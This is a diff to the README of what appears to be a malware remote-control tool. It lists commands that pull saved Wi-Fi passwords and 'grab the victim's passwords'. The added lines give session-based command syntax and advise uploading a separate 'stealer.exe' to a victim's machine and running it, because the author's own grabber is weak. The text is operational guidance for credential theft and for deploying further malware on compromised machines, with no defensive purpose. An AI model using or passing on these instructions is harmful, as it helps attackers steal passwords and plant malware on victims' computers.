@@ -82,6 +82,14 @@ wifipasswords - List saved Wi-Fi networks and passwords.
 
 grab - Grab the victim's passwords.
 
+### NOTE :
+
+You need to run command like "dede ss si:12345" (si:<session-id>)
+
+# Suggestion
+
+You can upload ```dede upload (upload a stealer.exe) si:<session-id>``` a stealer and run ```dede execute path/of/stealer.exe si:<session-id>``` the virus because my grabber is so bad :(
+
 # Thanks To :
 
 - LydexCoding
